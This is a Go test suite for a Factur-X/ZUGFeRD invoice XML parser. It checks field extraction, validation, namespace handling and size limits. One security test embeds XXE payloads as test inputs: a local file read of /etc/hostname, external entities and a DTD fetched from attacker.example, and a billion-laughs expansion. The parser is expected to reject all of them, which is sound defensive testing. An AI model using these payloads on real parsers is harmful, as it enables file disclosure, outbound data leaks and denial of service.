// Tests for package facturx (J0 task T16): parsing the CII XML embedded in a
// Factur-X / ZUGFeRD PDF. Stdlib only (encoding/xml). Spec: docs/spec.md
// "Normalization and naming" (Factur-X) and "Threat model" (no external
// entities, size caps).
//
// Expected API (implementer: follow exactly):
//
//	// MaxSize is the largest CII document ParseCII accepts, in bytes
//	// (0 < MaxSize <= 16 MiB). ParseCII never reads more than MaxSize+1 bytes
//	// from r (plus at most one decoder buffer).
//	const MaxSize = …
//
//	var (
//	    ErrTooLarge  error // input longer than MaxSize
//	    ErrUnsafeXML error // any directive: <!DOCTYPE …>, <!ENTITY …>, wherever it appears
//	    ErrNotCII    error // root is not {urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100}CrossIndustryInvoice
//	    ErrInvalid   error // malformed XML (incl. empty input / no root element, undefined
//	                       // entities, non-UTF-8 encoding, a second element after the root)
//	                       // or malformed field value
//	)
//
//	type Profile string
//	const (
//	    ProfileMinimum  Profile = "minimum"  // urn:factur-x.eu:1p0:minimum
//	    ProfileBasicWL  Profile = "basicwl"  // urn:factur-x.eu:1p0:basicwl
//	    ProfileBasic    Profile = "basic"    // urn:cen.eu:en16931:2017#compliant#urn:factur-x.eu:1p0:basic
//	    ProfileEN16931  Profile = "en16931"  // urn:cen.eu:en16931:2017
//	    ProfileExtended Profile = "extended" // urn:cen.eu:en16931:2017#conformant#urn:factur-x.eu:1p0:extended
//	)
//	// Missing or unrecognised guideline ID: Profile "" (not an error).
//
//	// Invoice holds the header fields facto uses. Elements are matched by
//	// namespace URI + local name along the exact path, never by prefix. Text is
//	// trimmed of surrounding whitespace. A missing element leaves the zero value
//	// (partial documents are not an error); a present but malformed value is
//	// ErrInvalid.
//	type Invoice struct {
//	    Profile         Profile   // ExchangedDocumentContext/GuidelineSpecifiedDocumentContextParameter/ID
//	    TypeCode        string    // ExchangedDocument/TypeCode ("380" invoice, "381" credit note…)
//	    Number          string    // ExchangedDocument/ID
//	    IssueDate       time.Time // ExchangedDocument/IssueDateTime/DateTimeString, format="102"
//	                              // (YYYYMMDD) only, UTC midnight; other formats or bad dates: ErrInvalid
//	    SellerName      string    // …/ApplicableHeaderTradeAgreement/SellerTradeParty/Name
//	    Currency        string    // …/ApplicableHeaderTradeSettlement/InvoiceCurrencyCode, 3 uppercase letters else ErrInvalid
//	    GrandTotalCents *int64    // …/SpecifiedTradeSettlementHeaderMonetarySummation/GrandTotalAmount;
//	                              // decimal with optional '-', at most 2 non-zero decimals ("84.120" ok,
//	                              // "84.125", "1e3", "abc", int64 overflow: ErrInvalid)
//	}
//
//	func ParseCII(r io.Reader) (Invoice, error)
package facturx_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/fsx"
	"github.com/FlorianRuen/facto/internal/normalize/facturx"
)

var update = flag.Bool("update", false, "rewrite golden files")

const (
	nsRSM = "urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100"
	nsRAM = "urn:un:unece:uncefact:data:standard:ReusableAggregateBusinessInformationEntity:100"
	nsUDT = "urn:un:unece:uncefact:data:standard:UnqualifiedDataType:100"
)

// view is the stable, test-owned JSON shape of an Invoice used by golden
// files, so that the golden format does not depend on Invoice's JSON tags.
type view struct {
	Profile         string `json:"profile"`
	TypeCode        string `json:"type_code"`
	Number          string `json:"number"`
	IssueDate       string `json:"issue_date"` // 2006-01-02 or ""
	SellerName      string `json:"seller_name"`
	Currency        string `json:"currency"`
	GrandTotalCents *int64 `json:"grand_total_cents"`
}

func toView(t *testing.T, inv facturx.Invoice) view {
	t.Helper()
	v := view{
		Profile:         string(inv.Profile),
		TypeCode:        inv.TypeCode,
		Number:          inv.Number,
		SellerName:      inv.SellerName,
		Currency:        inv.Currency,
		GrandTotalCents: inv.GrandTotalCents,
	}
	if !inv.IssueDate.IsZero() {
		if inv.IssueDate.Location() != time.UTC {
			t.Fatalf("IssueDate %s is not UTC", inv.IssueDate)
		}
		if h, m, s := inv.IssueDate.Clock(); h != 0 || m != 0 || s != 0 || inv.IssueDate.Nanosecond() != 0 {
			t.Fatalf("IssueDate %s is not midnight", inv.IssueDate)
		}
		v.IssueDate = inv.IssueDate.Format(time.DateOnly)
	}
	return v
}

func marshalView(t *testing.T, v view) []byte {
	t.Helper()
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		t.Fatalf("marshal view: %v", err)
	}
	return append(b, '\n')
}

func readTestdata(t *testing.T, path string) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Clean(path))
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return b
}

func TestParseCII_ProfilesGolden(t *testing.T) {
	t.Parallel()

	dir := filepath.Join("testdata", t.Name())
	for _, tc := range []string{"minimum", "basic", "en16931"} {
		t.Run(tc, func(t *testing.T) {
			t.Parallel()
			in := readTestdata(t, filepath.Join(dir, tc+".xml"))
			inv, err := facturx.ParseCII(bytes.NewReader(in))
			if err != nil {
				t.Fatalf("ParseCII(%s.xml): %v", tc, err)
			}
			got := marshalView(t, toView(t, inv))

			golden := tc + ".golden"
			if *update {
				root, err := fsx.Open(dir)
				if err != nil {
					t.Fatalf("open testdata: %v", err)
				}
				defer func() { _ = root.Close() }()
				if err := root.WriteAtomic(t.Context(), golden, got); err != nil {
					t.Fatalf("update golden: %v", err)
				}
			}
			want := readTestdata(t, filepath.Join(dir, golden))
			if !bytes.Equal(got, want) {
				t.Fatalf("ParseCII(%s.xml) mismatch (run go test -update and review)\n got: %s\nwant: %s", tc, got, want)
			}
		})
	}
}

// --- synthetic document builder for focused cases ---------------------------

func cii(body string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<rsm:CrossIndustryInvoice xmlns:rsm="` + nsRSM + `" xmlns:ram="` + nsRAM + `" xmlns:udt="` + nsUDT + `">` +
		body + `</rsm:CrossIndustryInvoice>`
}

func guideline(id string) string {
	return `<rsm:ExchangedDocumentContext><ram:GuidelineSpecifiedDocumentContextParameter><ram:ID>` + id +
		`</ram:ID></ram:GuidelineSpecifiedDocumentContextParameter></rsm:ExchangedDocumentContext>`
}

// exchanged builds ExchangedDocument; empty number/typeCode/dateElem are omitted.
func exchanged(number, typeCode, dateElem string) string {
	s := `<rsm:ExchangedDocument>`
	if number != "" {
		s += `<ram:ID>` + number + `</ram:ID>`
	}
	if typeCode != "" {
		s += `<ram:TypeCode>` + typeCode + `</ram:TypeCode>`
	}
	if dateElem != "" {
		s += `<ram:IssueDateTime>` + dateElem + `</ram:IssueDateTime>`
	}
	return s + `</rsm:ExchangedDocument>`
}

func date102(v string) string {
	return `<udt:DateTimeString format="102">` + v + `</udt:DateTimeString>`
}

func transaction(agreement, settlement string) string {
	return `<rsm:SupplyChainTradeTransaction><ram:ApplicableHeaderTradeAgreement>` + agreement +
		`</ram:ApplicableHeaderTradeAgreement><ram:ApplicableHeaderTradeDelivery/><ram:ApplicableHeaderTradeSettlement>` +
		settlement + `</ram:ApplicableHeaderTradeSettlement></rsm:SupplyChainTradeTransaction>`
}

func seller(name string) string {
	return `<ram:SellerTradeParty><ram:Name>` + name + `</ram:Name></ram:SellerTradeParty>`
}

func buyer(name string) string {
	return `<ram:BuyerTradeParty><ram:Name>` + name + `</ram:Name></ram:BuyerTradeParty>`
}

func settlement(currency, total string) string {
	s := ""
	if currency != "" {
		s += `<ram:InvoiceCurrencyCode>` + currency + `</ram:InvoiceCurrencyCode>`
	}
	s += `<ram:SpecifiedTradeSettlementHeaderMonetarySummation>`
	if total != "" {
		s += `<ram:GrandTotalAmount>` + total + `</ram:GrandTotalAmount>`
	}
	s += `<ram:DuePayableAmount>1.00</ram:DuePayableAmount>`
	return s + `</ram:SpecifiedTradeSettlementHeaderMonetarySummation>`
}

func cents(v int64) *int64 { return &v }

// full is a complete minimal document; cases below remove or alter one piece.
func full() string {
	return cii(guideline("urn:factur-x.eu:1p0:minimum") +
		exchanged("FA-2026-0001", "380", date102("20260314")) +
		transaction(seller("Fournisseur Exemple SAS")+buyer("Client Exemple"), settlement("EUR", "84.12")))
}

var fullView = view{
	Profile: "minimum", TypeCode: "380", Number: "FA-2026-0001", IssueDate: "2026-03-14",
	SellerName: "Fournisseur Exemple SAS", Currency: "EUR", GrandTotalCents: cents(8412),
}

func checkView(t *testing.T, got facturx.Invoice, want view) {
	t.Helper()
	g, w := marshalView(t, toView(t, got)), marshalView(t, want)
	if !bytes.Equal(g, w) {
		t.Fatalf("ParseCII mismatch\n got: %s\nwant: %s", g, w)
	}
}

func TestParseCII_PartialFields(t *testing.T) {
	t.Parallel()

	with := func(f func(*view)) view { v := fullView; f(&v); return v }
	tests := []struct {
		name string
		doc  string
		want view
	}{
		{name: "complete", doc: full(), want: fullView},
		{
			name: "only the number",
			doc:  cii(exchanged("FA-2026-0001", "", "")),
			want: view{Number: "FA-2026-0001"},
		},
		{
			name: "empty root",
			doc:  cii(""),
			want: view{},
		},
		{
			name: "no guideline",
			doc: cii(exchanged("FA-2026-0001", "380", date102("20260314")) +
				transaction(seller("Fournisseur Exemple SAS"), settlement("EUR", "84.12"))),
			want: with(func(v *view) { v.Profile = "" }),
		},
		{
			name: "unknown guideline",
			doc: cii(guideline("urn:exemple:unknown-guideline") + exchanged("FA-2026-0001", "380", date102("20260314")) +
				transaction(seller("Fournisseur Exemple SAS"), settlement("EUR", "84.12"))),
			want: with(func(v *view) { v.Profile = "" }),
		},
		{
			name: "no issue date",
			doc: cii(guideline("urn:factur-x.eu:1p0:minimum") + exchanged("FA-2026-0001", "380", "") +
				transaction(seller("Fournisseur Exemple SAS"), settlement("EUR", "84.12"))),
			want: with(func(v *view) { v.IssueDate = "" }),
		},
		{
			name: "no seller, buyer name not used",
			doc: cii(guideline("urn:factur-x.eu:1p0:minimum") + exchanged("FA-2026-0001", "380", date102("20260314")) +
				transaction(buyer("Client Exemple"), settlement("EUR", "84.12"))),
			want: with(func(v *view) { v.SellerName = "" }),
		},
		{
			name: "no grand total, due payable not used",
			doc: cii(guideline("urn:factur-x.eu:1p0:minimum") + exchanged("FA-2026-0001", "380", date102("20260314")) +
				transaction(seller("Fournisseur Exemple SAS"), settlement("EUR", ""))),
			want: with(func(v *view) { v.GrandTotalCents = nil }),
		},
		{
			name: "no currency",
			doc: cii(guideline("urn:factur-x.eu:1p0:minimum") + exchanged("FA-2026-0001", "380", date102("20260314")) +
				transaction(seller("Fournisseur Exemple SAS"), settlement("", "84.12"))),
			want: with(func(v *view) { v.Currency = "" }),
		},
		{
			name: "whitespace trimmed",
			doc: cii(guideline("\n  urn:factur-x.eu:1p0:minimum  \n") + exchanged("\n\t FA-2026-0001 \n", " 380 ", date102(" 20260314 ")) +
				transaction(seller("\n  Fournisseur Exemple SAS\n  "), settlement(" EUR ", " 84.12 "))),
			want: fullView,
		},
		{
			name: "seller name escaped characters",
			doc: cii(exchanged("FA-2026-0001", "", "") +
				transaction(seller("Fournisseur &amp; Fils Exemple &lt;SAS&gt;"), "")),
			want: view{Number: "FA-2026-0001", SellerName: "Fournisseur & Fils Exemple <SAS>"},
		},
		{
			name: "basicwl profile",
			doc:  cii(guideline("urn:factur-x.eu:1p0:basicwl")),
			want: view{Profile: "basicwl"},
		},
		{
			name: "extended profile",
			doc:  cii(guideline("urn:cen.eu:en16931:2017#conformant#urn:factur-x.eu:1p0:extended")),
			want: view{Profile: "extended"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			inv, err := facturx.ParseCII(strings.NewReader(tt.doc))
			if err != nil {
				t.Fatalf("ParseCII: %v", err)
			}
			checkView(t, inv, tt.want)
		})
	}
}

func TestParseCII_Amounts(t *testing.T) {
	t.Parallel()

	tests := []struct {
		in   string
		want int64
	}{
		{"84.12", 8412},
		{"84.1", 8410},
		{"84", 8400},
		{"84.120", 8412},
		{"0.00", 0},
		{"-12.50", -1250},
		{"1234567.89", 123456789},
	}
	for _, tt := range tests {
		t.Run(tt.in, func(t *testing.T) {
			t.Parallel()
			doc := cii(transaction("", settlement("EUR", tt.in)))
			inv, err := facturx.ParseCII(strings.NewReader(doc))
			if err != nil {
				t.Fatalf("ParseCII(total %q): %v", tt.in, err)
			}
			if inv.GrandTotalCents == nil || *inv.GrandTotalCents != tt.want {
				t.Fatalf("GrandTotalCents(%q) = %v, want %d", tt.in, inv.GrandTotalCents, tt.want)
			}
		})
	}
}

func TestParseCII_RejectsInvalid(t *testing.T) {
	t.Parallel()

	withTotal := func(v string) string { return cii(transaction("", settlement("EUR", v))) }
	withDate := func(elem string) string { return cii(exchanged("FA-2026-0001", "380", elem)) }
	tests := []struct {
		name    string
		doc     string
		wantErr error
	}{
		{name: "empty input", doc: "", wantErr: facturx.ErrInvalid},
		{name: "not xml", doc: "%PDF-1.7 synthetic", wantErr: facturx.ErrInvalid},
		{name: "truncated", doc: full()[:len(full())/2], wantErr: facturx.ErrInvalid},
		{name: "second root after the first", doc: full() + strings.TrimPrefix(cii(exchanged("FA-EVIL-9999", "", "")), `<?xml version="1.0" encoding="UTF-8"?>`+"\n"), wantErr: facturx.ErrInvalid},
		{name: "non utf8 encoding", doc: strings.Replace(full(), "UTF-8", "ISO-8859-1", 1), wantErr: facturx.ErrInvalid},
		{name: "ubl root", doc: `<Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2"><ID>FA-1</ID></Invoice>`, wantErr: facturx.ErrNotCII},
		{name: "right local name wrong namespace", doc: strings.Replace(full(), `xmlns:rsm="`+nsRSM+`"`, `xmlns:rsm="urn:exemple:not-cii"`, 1), wantErr: facturx.ErrNotCII},
		{name: "no namespace", doc: `<CrossIndustryInvoice><ExchangedDocument/></CrossIndustryInvoice>`, wantErr: facturx.ErrNotCII},
		{name: "date bad month", doc: withDate(date102("20261345")), wantErr: facturx.ErrInvalid},
		{name: "date wrong length", doc: withDate(date102("2026031")), wantErr: facturx.ErrInvalid},
		{name: "date iso format", doc: withDate(date102("2026-03-14")), wantErr: facturx.ErrInvalid},
		{name: "date format 610", doc: withDate(`<udt:DateTimeString format="610">202603</udt:DateTimeString>`), wantErr: facturx.ErrInvalid},
		{name: "amount three decimals", doc: withTotal("84.125"), wantErr: facturx.ErrInvalid},
		{name: "amount letters", doc: withTotal("abc"), wantErr: facturx.ErrInvalid},
		{name: "amount exponent", doc: withTotal("1e3"), wantErr: facturx.ErrInvalid},
		{name: "amount comma decimal", doc: withTotal("84,12"), wantErr: facturx.ErrInvalid},
		{name: "amount empty", doc: withTotal(" "), wantErr: facturx.ErrInvalid},
		{name: "amount overflow", doc: withTotal("99999999999999999999.00"), wantErr: facturx.ErrInvalid},
		{name: "currency lowercase", doc: cii(transaction("", settlement("eur", "1.00"))), wantErr: facturx.ErrInvalid},
		{name: "currency too long", doc: cii(transaction("", settlement("EURO", "1.00"))), wantErr: facturx.ErrInvalid},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			inv, err := facturx.ParseCII(strings.NewReader(tt.doc))
			if !errors.Is(err, tt.wantErr) {
				t.Fatalf("ParseCII: err = %v, want errors.Is %v", err, tt.wantErr)
			}
			if inv.Number == "FA-EVIL-9999" {
				t.Fatal("content after the root element was parsed")
			}
		})
	}
}

func TestParseCII_NamespacesByURINotPrefix(t *testing.T) {
	t.Parallel()

	// Same document as full(), with a default namespace for rsm and other prefixes.
	doc := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<CrossIndustryInvoice xmlns="` + nsRSM + `" xmlns:x="` + nsRAM + `" xmlns:y="` + nsUDT + `">` +
		`<ExchangedDocumentContext><x:GuidelineSpecifiedDocumentContextParameter><x:ID>urn:factur-x.eu:1p0:minimum</x:ID></x:GuidelineSpecifiedDocumentContextParameter></ExchangedDocumentContext>` +
		`<ExchangedDocument><x:ID>FA-2026-0001</x:ID><x:TypeCode>380</x:TypeCode><x:IssueDateTime><y:DateTimeString format="102">20260314</y:DateTimeString></x:IssueDateTime></ExchangedDocument>` +
		`<SupplyChainTradeTransaction><x:ApplicableHeaderTradeAgreement><x:SellerTradeParty><x:Name>Fournisseur Exemple SAS</x:Name></x:SellerTradeParty></x:ApplicableHeaderTradeAgreement>` +
		`<x:ApplicableHeaderTradeSettlement><x:InvoiceCurrencyCode>EUR</x:InvoiceCurrencyCode><x:SpecifiedTradeSettlementHeaderMonetarySummation><x:GrandTotalAmount>84.12</x:GrandTotalAmount></x:SpecifiedTradeSettlementHeaderMonetarySummation></x:ApplicableHeaderTradeSettlement></SupplyChainTradeTransaction>` +
		`</CrossIndustryInvoice>`
	inv, err := facturx.ParseCII(strings.NewReader(doc))
	if err != nil {
		t.Fatalf("ParseCII: %v", err)
	}
	checkView(t, inv, fullView)

	// A "ram:Name" whose prefix is rebound to a foreign namespace is not the seller name.
	decoy := cii(exchanged("FA-2026-0001", "", "") + transaction(
		`<ram:SellerTradeParty><ram:Name xmlns:ram="urn:exemple:decoy">Imposteur Exemple</ram:Name></ram:SellerTradeParty>`, ""))
	inv, err = facturx.ParseCII(strings.NewReader(decoy))
	if err != nil {
		t.Fatalf("ParseCII(decoy): %v", err)
	}
	if inv.SellerName != "" {
		t.Fatalf("SellerName = %q from a foreign namespace, want \"\"", inv.SellerName)
	}
}

// entityPayload is planted in every malicious document: it must never reach
// the parsed Invoice nor the error message.
const entityPayload = "INJECTED-ENTITY-PAYLOAD"

func TestParseCII_RejectsDoctypeAndEntities(t *testing.T) {
	t.Parallel()

	body := exchanged("&xxe;", "380", date102("20260314")) + transaction(seller("Fournisseur Exemple SAS"), settlement("EUR", "84.12"))
	root := `<rsm:CrossIndustryInvoice xmlns:rsm="` + nsRSM + `" xmlns:ram="` + nsRAM + `" xmlns:udt="` + nsUDT + `">`
	end := `</rsm:CrossIndustryInvoice>`
	decl := `<?xml version="1.0" encoding="UTF-8"?>` + "\n"

	laughs := `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY lol "` + entityPayload + `">`
	prev := "lol"
	for i := 1; i <= 9; i++ {
		name := "lol" + string(rune('0'+i))
		laughs += `<!ENTITY ` + name + ` "` + strings.Repeat("&"+prev+";", 10) + `">`
		prev = name
	}
	laughs += `<!ENTITY xxe "&lol9;">]>`

	tests := []struct {
		name string
		doc  string
		// wantErr lists acceptable sentinels (any one must match).
		wantErr []error
	}{
		{
			name:    "external entity file",
			doc:     decl + `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "external entity http",
			doc:     decl + `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY xxe SYSTEM "http://attacker.example/` + entityPayload + `">]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "internal entity",
			doc:     decl + `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY xxe "` + entityPayload + `">]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "billion laughs",
			doc:     decl + laughs + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "parameter entity",
			doc:     decl + `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY % p SYSTEM "http://attacker.example/p.dtd"> %p;]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "external dtd without internal subset",
			doc:     decl + `<!DOCTYPE rsm:CrossIndustryInvoice SYSTEM "http://attacker.example/invoice.dtd">` + root + strings.Replace(body, "&xxe;", "FA-2026-0001", 1) + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "doctype after comment and whitespace",
			doc:     decl + "<!-- synthetic -->\n\n" + `<!DOCTYPE rsm:CrossIndustryInvoice [<!ENTITY xxe "` + entityPayload + `">]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "lowercase doctype",
			doc:     decl + `<!doctype rsm:CrossIndustryInvoice [<!ENTITY xxe "` + entityPayload + `">]>` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "entity declaration without doctype",
			doc:     decl + `<!ENTITY xxe "` + entityPayload + `">` + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "doctype inside the root element",
			doc:     decl + root + `<!DOCTYPE x [<!ENTITY xxe "` + entityPayload + `">]>` + body + end,
			wantErr: []error{facturx.ErrUnsafeXML},
		},
		{
			name:    "undefined entity reference",
			doc:     decl + root + body + end,
			wantErr: []error{facturx.ErrUnsafeXML, facturx.ErrInvalid},
		},
		{
			name:    "html entity",
			doc:     decl + root + strings.Replace(body, "&xxe;", "FA&nbsp;2026", 1) + end,
			wantErr: []error{facturx.ErrUnsafeXML, facturx.ErrInvalid},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			inv, err := facturx.ParseCII(strings.NewReader(tt.doc))
			if err == nil {
				t.Fatalf("ParseCII accepted a document with a DTD/entity: %+v", inv)
			}
			matched := false
			for _, want := range tt.wantErr {
				matched = matched || errors.Is(err, want)
			}
			if !matched {
				t.Fatalf("ParseCII: err = %v, want errors.Is one of %v", err, tt.wantErr)
			}
			if strings.Contains(err.Error(), entityPayload) {
				t.Fatalf("error message leaks entity content: %v", err)
			}
			if inv.Number != "" || inv.SellerName != "" || inv.GrandTotalCents != nil {
				t.Fatalf("ParseCII returned data alongside an error: %+v", inv)
			}
		})
	}
}

// padTo returns full() padded with a comment so that it is exactly n bytes.
func padTo(t *testing.T, n int) []byte {
	t.Helper()
	doc := full()
	end := `</rsm:CrossIndustryInvoice>`
	head := strings.TrimSuffix(doc, end)
	pad := n - len(doc) - len("<!---->")
	if pad < 0 {
		t.Fatalf("cannot pad %d-byte document to %d", len(doc), n)
	}
	out := head + "<!--" + strings.Repeat("x", pad) + "-->" + end
	if len(out) != n {
		t.Fatalf("padTo: got %d bytes, want %d", len(out), n)
	}
	return []byte(out)
}

// countingReader counts bytes handed to the parser.
type countingReader struct {
	r io.Reader
	n int64
}

func (c *countingReader) Read(p []byte) (int, error) {
	n, err := c.r.Read(p)
	c.n += int64(n)
	return n, err
}

// endless yields a valid document prefix followed by an unterminated comment
// that never ends.
type endless struct{ prefix []byte }

func (e *endless) Read(p []byte) (int, error) {
	if len(e.prefix) > 0 {
		n := copy(p, e.prefix)
		e.prefix = e.prefix[n:]
		return n, nil
	}
	for i := range p {
		p[i] = 'x'
	}
	return len(p), nil
}

func TestParseCII_SizeCap(t *testing.T) {
	t.Parallel()

	if facturx.MaxSize <= 0 || facturx.MaxSize > 16<<20 {
		t.Fatalf("MaxSize = %d, want in (0, 16 MiB]", facturx.MaxSize)
	}

	t.Run("exactly MaxSize is accepted", func(t *testing.T) {
		t.Parallel()
		inv, err := facturx.ParseCII(bytes.NewReader(padTo(t, facturx.MaxSize)))
		if err != nil {
			t.Fatalf("ParseCII(MaxSize bytes): %v", err)
		}
		checkView(t, inv, fullView)
	})

	t.Run("MaxSize+1 is rejected", func(t *testing.T) {
		t.Parallel()
		inv, err := facturx.ParseCII(bytes.NewReader(padTo(t, facturx.MaxSize+1)))
		if !errors.Is(err, facturx.ErrTooLarge) {
			t.Fatalf("ParseCII(MaxSize+1 bytes): err = %v, want ErrTooLarge", err)
		}
		if inv.Number != "" {
			t.Fatalf("ParseCII returned data alongside ErrTooLarge: %+v", inv)
		}
	})

	t.Run("endless stream stops early", func(t *testing.T) {
		t.Parallel()
		prefix := cii(exchanged("FA-2026-0001", "", ""))
		prefix = strings.TrimSuffix(prefix, `</rsm:CrossIndustryInvoice>`) + "<!--"
		cr := &countingReader{r: &endless{prefix: []byte(prefix)}}
		_, err := facturx.ParseCII(cr)
		if !errors.Is(err, facturx.ErrTooLarge) {
			t.Fatalf("ParseCII(endless): err = %v, want ErrTooLarge", err)
		}
		if limit := int64(facturx.MaxSize) + 64<<10; cr.n > limit {
			t.Fatalf("ParseCII read %d bytes, want <= %d", cr.n, limit)
		}
	})
}

var errReader = errors.New("synthetic read failure")

type failingReader struct{ prefix []byte }

func (f *failingReader) Read(p []byte) (int, error) {
	if len(f.prefix) > 0 {
		n := copy(p, f.prefix)
		f.prefix = f.prefix[n:]
		return n, nil
	}
	return 0, errReader
}

func TestParseCII_ReaderErrorIsWrapped(t *testing.T) {
	t.Parallel()

	_, err := facturx.ParseCII(&failingReader{prefix: []byte(full()[:200])})
	if !errors.Is(err, errReader) {
		t.Fatalf("ParseCII: err = %v, want it to wrap the reader error", err)
	}
}
